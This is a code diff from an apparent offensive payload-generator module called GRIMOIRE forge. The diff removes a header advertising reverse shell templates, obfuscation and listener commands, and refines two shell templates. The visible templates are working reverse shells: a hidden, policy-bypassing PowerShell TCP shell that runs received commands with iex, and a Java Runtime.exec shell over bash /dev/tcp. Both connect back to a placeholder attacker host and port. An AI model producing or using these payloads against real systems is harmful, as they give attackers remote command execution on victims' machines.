@@ -1,19 +1,4 @@
-# ═══════════════════════════════════════════════════════════════
-#  GRIMOIRE v2.0 — forge/__init__.py
-#  Payload Generator — shells, obfuscation, encoding, export
-#
-#  Developer  : Light
-#  Alias      : Neok1ra
-#  GitHub     : https://github.com/ne0k1r4
-#  Tool       : GRIMOIRE — The Death Note of the digital world
-#
-#  Features:
-#    15 reverse shell templates
-#    5 encoding methods
-#    3 obfuscation layers
-#    Save payload to file
-#    Listener command generator
-# ═══════════════════════════════════════════════════════════════
+# forge — payload generator
 
 import base64, os
 from datetime import datetime
@@ -99,7 +84,7 @@ SHELLS = {
         "lang": "powershell", "os": "windows",
         "cmd": ("powershell -NoP -NonI -W Hidden -Exec Bypass "
                 "-C \"$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});"
-                "$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
+                "$s=$c.GetStream();[byte[]]$b=New-Object Byte[] 65536;"
                 "while(($i=$s.Read($b,0,$b.Length)) -ne 0){{"
                 "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
                 "$r=(iex $d 2>&1|Out-String);"
@@ -107,12 +92,12 @@ SHELLS = {
     },
     "java": {
         "lang": "java", "os": "linux/win",
-        "cmd": ("java -jar nothing.jar; "
-                "Runtime r=Runtime.getRuntime();"
+        "cmd": ("Runtime r=Runtime.getRuntime();"
                 "Process p=r.exec(new String[]{{\"bash\",\"-c\","
                 "\"exec 5<>/dev/tcp/{lhost}/{lport};cat <&5|while read l;do $l 2>&5 >&5;done\"}});"
                 "p.waitFor();"),
     },
+
 }
 
 # ── Encoders ──────────────────────────────────────────────────
